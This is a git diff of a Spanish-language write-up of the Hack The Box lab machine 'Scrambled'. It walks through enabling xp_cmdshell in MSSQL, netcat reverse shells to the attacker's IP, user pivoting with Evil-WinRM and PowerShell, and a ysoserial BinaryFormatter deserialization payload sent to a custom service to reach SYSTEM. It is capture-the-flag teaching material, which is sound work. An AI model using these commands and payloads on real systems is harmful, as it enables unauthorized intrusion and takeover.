 SQL (SCRM\administrator  dbo@ScrambleHR)> xp_cmdshell "whoami"
 ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
 ```
 
-No lo esta, tenemos 2 formas de activarla:
+No lo está, tenemos 2 formas de activarla:
 
 * Activandola con el comando `enable xp_cmdshell`:
 ```sql
@@ -1116,13 +1187,12 @@ INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run
 SQL (SCRM\administrator  dbo@master)> RECONFIGURE;
 ```
 
-Y ya podemos ejecutar comandos como si fuera una **cmd**:
+* Y ya podemos ejecutar comandos como si fuera una **cmd**:
 ```sql
 SQL (SCRM\administrator  dbo@master)> xp_cmdshell "whoami"
 output        
 -----------   
 scrm\sqlsvc   
-
 NULL
 ```
 
@@ -1142,14 +1212,14 @@ curl: try 'curl --help' for more information
 NULL
 ```
 
-Kali Linux ya tiene un binario de **netcat** y también **SecLists**:
+**Kali Linux** y **SecLists** tienen un binario de **netcat**:
 ```bash
 locate nc.exe
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
 /usr/share/windows-resources/binaries/nc.exe
 ```
 
-Copialo en tu directorio de trabajo y abre un servidor en **Python**:
+Cópialo en tu directorio de trabajo y abre un servidor en **Python**:
 ```bash
 cp /usr/share/windows-resources/binaries/nc.exe .
 
@@ -1170,13 +1240,13 @@ output
 NULL
 ```
 
-Abre una sesión de netcat, pero usando **rlwrap** (muy útil para Windows):
+Abre una sesión de **netcat**, pero usando **rlwrap** (muy útil para **Windows**):
 ```bash
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-Y desde la sesión de **MSSQL**, usemos el binario de netcat para obtener una **cmd**:
+Y desde la sesión de **MSSQL**, usemos el binario de **netcat** para obtener una **cmd**:
 ```sql
 SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd Tu_IP 443"
 ```
@@ -1206,14 +1276,14 @@ Genial, pero este usuario no tiene la flag, pues existe el **usuario MiscSvc** y
 <br>
 
 
-<h2 id="">Aplicando User Pivoting para Convertirnos en Usuario miscsvc</h2>
+<h2 id="Pivot">Aplicando User Pivoting para Convertirnos en Usuario MiscSvc</h2>
 
-Actualmente, somos el **usuario sqlsvc** y por lo que sabemos existe un usuario llamado **MiscSvc**, como ya tenemos su contraseña solamente debemos pivotear a su cuenta.
+Actualmente, somos el **usuario sqlsvc** y por lo que sabemos existe un usuario llamado **MiscSvc**, cómo ya tenemos su contraseña, solamente debemos pivotear a su cuenta.
 
 Tenemos 3 formas de realizar este proceso:
-* Evil-WinRM autenticandonos vía Kerberos
-* Ocupando Script-Blocks e Invoke-Command usando PowerShell
-* Utilizando Enter-PSSession de PowerShell para obtener una sesión como MiscSvc
+* **Evil-WinRM** autenticándonos vía **Kerberos**.
+* Ocupando **Script-Blocks e Invoke-Command usando PowerShell**.
+* Utilizando **Enter-PSSession de PowerShell** para obtener una sesión como **MiscSvc**.
 
 Vamos a aplicarlas todas.
 
@@ -1226,7 +1296,7 @@ Para realizar este proceso, es necesario que tengas el archivo `/etc/krb5.conf`,
 apt install krb5-user krb5-config
 ```
 
-Y te preguntaras, ¿para que necesitamos este archivo?
+Y te preguntarás, ¿para qué necesitamos este archivo?
 
 | **Archivo krb5.conf** |
 |:-----------:|
@@ -1234,7 +1304,7 @@ Y te preguntaras, ¿para que necesitamos este archivo?
 
 <br>
 
-Este archivo contienes las siguientes configuraciones:
+Este archivo contiene las siguientes configuraciones:
 
 | Configuración    | Descripción |
 |--------------------------------|
@@ -1245,7 +1315,7 @@ Este archivo contienes las siguientes configuraciones:
 
 <br>
 
-Creo que queda claro para que es este archivo.
+Creo que queda claro para qué es este archivo.
 
 Una vez que lo tengas, vamos a modificarlo para agregarle el dominio del **servicio Kerberos** de la máquina víctima:
 ```bash
@@ -1265,12 +1335,12 @@ Una vez que lo tengas, vamos a modificarlo para agregarle el dominio del **servi
         scrm.local = SCRM.LOCAL
 ```
 
-Y también debes de configurar el **Evil-WinRM** para agregarle la caracteristica **remote path completion**, para este paso debes verificar tu versión de **Ruby** y seguir los pasos que indica el **GitHub** de esta herramienta (OJO, debes seguir los pasos en base a tu versión de **Ruby**):
+Y también debes de configurar el **Evil-WinRM** para agregarle la característica **remote path completion**, para este paso debes verificar tu versión de **Ruby** y seguir los pasos que indica el **GitHub** de esta herramienta (OJO, debes seguir los pasos con base en tu versión de **Ruby**):
 * <a href="https://github.com/Hackplayers/evil-winrm#Remote-path-completion" target="_blank">Repositorio de Hackplayers: evil-winrm - Remote path completion</a>
 
-Es posible que te salga un error sobre un archivo llamado **ffi**, esta es una librería de **Ruby** que a lo mejor tienes, pero que por X o Y motivo no esta funcionando correctamente. (Si no te sale este error, continua con lo demás)
+Es posible que te salga un error sobre un archivo llamado **ffi**. Esta es una librería de **Ruby** que a lo mejor tienes, pero que por X o Y motivo no está funcionando correctamente. (Si no te sale este error, continúa con lo demás)
 
-Para solucionarlo aplica los siguientes comandos:
+Para solucionarlo, aplica los siguientes comandos:
 ```bash
 gem uninstall ffi
 gem install ffi --platform=ruby
@@ -1298,7 +1368,7 @@ scrm\miscsvc
 
 <h3 id="blocks">Utilizando Script-Blocks y cmdlet Invoke-Command de PowerShell para Obtener Shell como Usuario MiscSvc</h3>
 
-Como ya tenemos una sesión interactiva, podemos probar a entrar en PowerShell y aplicar Script-Blocks e Invoke-Command con tal de obtener una sesión como el usuario MiscSvc usando el binario netcat que ya tenemos aquí.
+Como ya tenemos una sesión interactiva, podemos probar a entrar en **PowerShell** y aplicar **Script-Blocks e Invoke-Command** con tal de obtener una sesión como el **usuario MiscSvc** usando el binario **netcat** que ya tenemos aquí.
 
 | **Script Blocks en PowerShell** |
 |:-----------:|
@@ -1403,7 +1473,6 @@ listening on [any] 443 ...
 connect to [Tu_IP] from (UNKNOWN) [10.10.11.168] 58708
 Microsoft Windows [Version 10.0.17763.2989]
 (c) 2018 Microsoft Corporation. All rights reserved.
-
 C:\Users\miscsvc\Documents>whoami
 whoami
 scrm\miscsvc
@@ -1412,13 +1481,13 @@ Listo.
 
 <br>
 
-<h3 id="">Utilizando cmdlet Enter-PSSession para Obtener Sesión en PowerShell como Usuario MiscSvc (Fallo para Mi)</h3>
+<h3 id="PSSesion">Utilizando cmdlet Enter-PSSession para Obtener Sesión en PowerShell como Usuario MiscSvc (Fallo para Mi)</h3>
 
 Para realizar este paso, necesitamos configurar el `/etc/krb5.conf` del mismo modo que hicimos con la forma de **Evil-WinRM**.
 
-También debes tener PowerShell en tu máquina, en Kali ya esta instalado por defecto.
+También debes tener **PowerShell** en tu máquina, en **Kali** ya está instalado por defecto.
 
-Abrimos PowerShell y usamos el cmdlet Enter-PSSession, debemos indicarle el dominio y el usuario para que nos pida la contraseña:
+Abrimos **PowerShell** y usamos el **cmdlet Enter-PSSession**. Debemos indicarle el dominio y el usuario para que nos pida la contraseña:
 ```bash
 pwsh
 PowerShell 7.2.6
@@ -1435,7 +1504,7 @@ Password for user MiscSvc: *****************
 Enter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.
 ```
 
-Nos pide que instalemos la **librería WSMan**, puedes encontrar los pasos para instalarla aquí:
+Nos pide que instalemos la **librería WSMan**. Puedes encontrar los pasos para instalarla aquí:
 * <a href="https://github.com/jborean93/omi" target="_blank">Repositorio de jborean93: omi</a>
 
 Una vez que lo tengas instalado, vuelve a probar el **cmdlet Enter-PSSession**:
@@ -1447,7 +1516,7 @@ Copyright (c) Microsoft Corporation.
 https://aka.ms/powershell
 Type 'help' to get help.
 
-PS /home/berserkwings/Desktop/HTB/Retired_Machines/Scrambled/OSCP_Style/content> Enter-PSSession dc1.scrm.local -Credential MiscSvc
+PS ../Scrambled/OSCP_Style/content> Enter-PSSession dc1.scrm.local -Credential MiscSvc
 
 PowerShell credential request
 Enter your credentials.                                                                                                                                             
@@ -1455,13 +1524,13 @@ Password for user MiscSvc: *****************
 
 Enter-PSSession: Connecting to remote server dc1.scrm.local failed with the following error message : Authorization failed For more information, see the about_Remote_Troubleshooting Help topic.
 ```
-Y en mi caso no funciono, no se porque razón no me da acceso, pero puede que a ti te funcione y es una opción que puedes probar en otras máquina que sean **AD**.
+Y en mi caso no funciono, no sé por qué razón no me da acceso, pero puede que a ti te funcione y es una opción que puedes probar en otras máquinas que sean **AD**.
 
-<h2 id="">Analizando Binario con DNSpy</h2>
+<h2 id="DNSpy">Analizando Binario y DLL con DNSpy</h2>
 
-Si recordamos cuando entramos al **servicio SMB** via Kerberos, vimos varios archivos compartidos. 
+Si recordamos cuando entramos al **servicio SMB vía Kerberos**, vimos varios archivos compartidos. 
 
-Podemos listarlos en nuestra sesión como el **usuario MiscSvc** (en mi caso, me quede con la sesión de **Evil-WinRM**):
+Podemos listarlos en nuestra sesión como el **usuario MiscSvc** (en mi caso, me quedé con la sesión de **Evil-WinRM**):
 ```batch
 *Evil-WinRM* PS C:\> cd Shares
 *Evil-WinRM* PS C:\Shares> dir
@@ -1489,7 +1558,7 @@ Mode                LastWriteTime         Length Name
 -a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll
 ```
 
-Vamos a descargar ese **binario y el dll**:
+Vamos a descargar ese **binario y el archivo DLL**:
 ```batch
 *Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> download ScrambleClient.exe
                                         
@@ -1503,66 +1572,224 @@ Info: Downloading C:\Shares\IT\Apps\Sales Order Client\ScrambleLib.dll to Scramb
 Info: Download successful!
 ```
 
-Una vez descargados, vamos a mandarlos a una **máquina virtual Windows 10** para ver como funcionan, puedes hacerlo levantando un servidor en **Python**.
+Una vez descargados, vamos a mandarlos a una **máquina virtual Windows 10** para ver cómo funcionan. Puedes hacerlo levantando un servidor en **Python**.
 
 -----------
 **IMPORTANTE**:
 
-Te recomiendo que mandes la VPN de HTB, la habilites con el cliente de OpenVPN y configures el dominio y el servidor del dominio en el `/etc/hosts` del Windwows 10, para que funcione correctamente el binario.
+Te recomiendo que mandes la **VPN de HTB**, la habilites con el **cliente de OpenVPN** y configures el dominio y el servidor del dominio en el `/etc/hosts` del **Windows 10**, para que funcione correctamente el binario.
+
 ----------
 
 <p align="center">
-<img src="/assets/images/htb-writeup-scrambled/Captura6.png">
+<img src="/assets/images/htb-writeup-scrambled/Captura7.png">
 </p>
 
 Probemos nuestra conexión con la máquina víctima:
-```batch
 
-```
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura8.png">
+</p>
+
 Funciona correctamente.
 
 Si abrimos el binario, veremos los mismos campos que vimos en la página web.
 
-IMAGEN
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura9.png">
+</p>
 
-Dale al bóton de **edit** y veras que podemos configurar el servidor del dominio y que se ejecuta en el puerto 4411. Además, podemos habilitar una casilla para activar el debugging de los logs:
+Dale al botón de **edit** y verás que podemos configurar el servidor del dominio y que se ejecuta en el **puerto 4411**. Además, podemos habilitar una casilla para activar el debugging de los logs:
 
-IMAGEN
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura10.png">
+</p>
 
-Veamos que pasa si con **netcat** nos conectamos a ese puerto:
+Veamos qué pasa si con **netcat** nos conectamos a ese puerto:
 ```bash
+nc 10.10.11.168 4411
+SCRAMBLECORP_ORDERS_V1.0.3;
+hola
+ERROR_UNKNOWN_COMMAND;
+help
+ERROR_UNKNOWN_COMMAND;
+^C
+```
+Por lo que veo, nos pide un comando que desconocemos por ahora.
 
+Vamos a jugar para ver qué pasa si ponemos los usuarios y contraseñas que ya tenemos:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura11.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura12.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura13.png">
+</p>
+
+No nos dejó conectar con ninguno, pero se registró algo en un archivo de logs que se generó por el uso del binario. Quiero pensar que esto pasó por activar esa casilla de debugging:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura14.png">
+</p>
+
+Podemos ver que sucedieron muchas cosas, por ejemplo, se intenta hacer la conexión hacia el **servidor SCRAMBLECORP_ORDERS_V1.0.3** usando las credenciales que pusimos, pero ninguno se pudo conectar:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura15.png">
+</p>
+
+Vamos a analizar el binario con **DNSpy**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura16.png">
+</p>
+
+Hay muchas cosillas que podemos encontrar aquí, por ejemplo, la clase que realiza el login desde la ventana:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura17.png">
+</p>
+
+También vemos la clase que genera el archivo con los logs:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura18.png">
+</p>
+
+Pero, por más que busquemos, no hay algo que de verdad nos ayude, así que vamos a ver el **archivo DLL**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura19.png">
+</p>
+
+Si analizamos su contenido, encontraremos cosas críticas, por ejemplo, una clase que está aplicando una **serialización y deserialización** siendo ambas en **base64**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura20.png">
+</p>
+
+Entiendo que se está serializando una orden creada y luego se deserializa una orden recibida, ósea que si creamos una orden, esta se va a serializar, pero si recibimos una orden, esta se va a deserializar.
+
+Si revisamos la **clase ScrambleNetClient**, vamos a encontrar algo muy curioso:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura21.png">
+</p>
+
+Resulta que es un usuario de algún dev, que al usarlo, nos va a dar acceso al servidor como si fuera un Bypass.
+
+Vamos a usar ese usuario, sin ponerle contraseña, y veamos qué pasa:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura22.png">
+</p>
+
+Excelente, parece que ya hay órdenes creadas y recibidas.
+
+Parece que tenemos la opción de crear una orden:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura23.png">
+</p>
+
+Probemos a crear una orden random y después, veamos los logs para ver si lo que entendimos que hace el binario es cierto:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura24.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura25.png">
+</p>
+
+Muy bien, es correcto lo que vimos que pasa. Nuestra orden se serializó y se envió, las otras órdenes que llegaron, fueron deserializadas para poder ver su contenido.
+
+También, vemos que hay varios comandos como **LIST_ORDERS, SUCCESS y UPLOAD_ORDER**, creo que no hace falta explicar qué hace cada una.
+
+Entonces, se están usando estos comandos junto a un código en **base64 serializado** en el **servidor SCRAMBLECORP_ORDERS_V1.0.3**, para realizar acciones entre el binario y el servidor.
+
+Podemos aprovecharnos de esto para ganar acceso a la máquina.
+
+<h2 id="ysoserial">Aplicando Ataque de Deserialización con ysoserial</h2>
+
+¿Qué es un Ataque de Deserialización?
+
+| **Ataque de Deserialización** |
+|:-----------:|
+| *Un ataque de deserialización ocurre cuando un atacante aprovecha la deserialización insegura de datos en una aplicación. La deserialización es el proceso mediante el cual los datos se transforman de un formato serializado (como JSON, XML, o binario) en un objeto en memoria que pueda ser manipulado por un programa.* |
+
+<br>
+
+Si una aplicación deserializa objetos sin validar adecuadamente los datos entrantes, un atacante podría enviar datos manipulados para:
+* Ejecutar código arbitrario.
+* Modificar el estado del objeto.
+* Escalar privilegios.
+
+La idea, es que vamos a serializar un comando que va a ejecutar el binario **netcat** para obtener una sesión, ya que suponemos que el dueño del servidor es el administrador.
+
+Para realizar esto, necesitamos la herramienta ysoserial que puedes descargar desde aquí (solo para usar en **Windows**)
+* <a href="https://github.com/pwntester/ysoserial.net" target="_blank">Repositorio de pwntester: ysoserial.net</a>
+
+Tan solo ve a los releases y obtén el comprimido, descomprímelo y abre una cmd en **Windows** para usar el **ysoserial**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-scrambled/Captura26.png">
+</p>
+
+Debemos indicarle el gadget (sería **WindowsIdentity**), la clase de formato (sería **BinaryFormatter**, el mismo que usa el binario), cómo será el output (sería **base64**) y, por último, el comando a ejecutar.
+
+Hagamoslo:
+```batch
+ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c "C:\Temp\nc.exe -e cmd Tu_IP 443"
+AAEAAAD///....
 ```
 
+Abre una **netcat con rlwrap**:
+```bash
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+```
 
-Vamos a jugar para ver que pasa si ponemos los usuarios y contraseñas que ya tenemos:
+Abre otra **netcat** apuntando al servidor:
+```bash
+nc 10.10.11.168 4411
+SCRAMBLECORP_ORDERS_V1.0.3;
+```
 
-IMAGENES DE LOS 3 USUARIOS
+Copia el código resultante en la **netcat** del servidor, agrégale el comando `UPLOAD_ORDER;` y ejecútalo:
+```bash
+nc 10.10.11.168 4411
+SCRAMBLECORP_ORDERS_V1.0.3;
+UPLOAD_ORDER;AAEAAAD///....
+...
+...
 
-No nos dejo conectar con ninguno, pero se registro algo en un archivo de logs que se genero por el uso del binario, quiero pensar que esto paso por activar esa casilla de debugging:
+```
+Aunque te marque un error, el comando sí se ejecutó.
 
-IMAGEN
+Ve el resultado:
+```bash
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [10.10.11.168] 61214
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
 
-Podemos ver muchas cosas
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
 
-Vamos a analizar el binario con DNSpy:
+Y listo, ya con esto completamos la máquina.
 
-IMAGEN
+Si bien podemos usar el **JuicyPotatonNG** para escalar privilegios siendo el **usuario sqlsvc**, en mi caso no se pudo.
 
-Hay muchas cosillas que podemos encontrar aquí, por ejemplo, 
-
-
-
-<h2 id="">Probando Serialización </h2>
-
-<h2 id=""></h2>
-
-
-
-
-<h2 id="potatoNG">Probando Juicy Potato NG</h2>
-
-
+No sé si porque hayan inhabilitado esta opción o porque no funciona, pero de que se podía, se podía.
 
 
 <br>
@@ -1572,7 +1799,17 @@ Hay muchas cosillas que podemos encontrar aquí, por ejemplo,
 </div>
 
 
-links
+* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
+* https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/
+* https://learn.microsoft.com/es-es/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16
+* https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+* https://github.com/jborean93/omi
+* https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
+* https://codebeautify.org/ntlm-hash-generator
+* https://github.com/antonioCoco/JuicyPotatoNG?tab=readme-ov-file
+* https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/
+* https://github.com/pwntester/ysoserial.net
+* https://github.com/attackdebris/kerberos_enum_userlists
 
 
 <br>
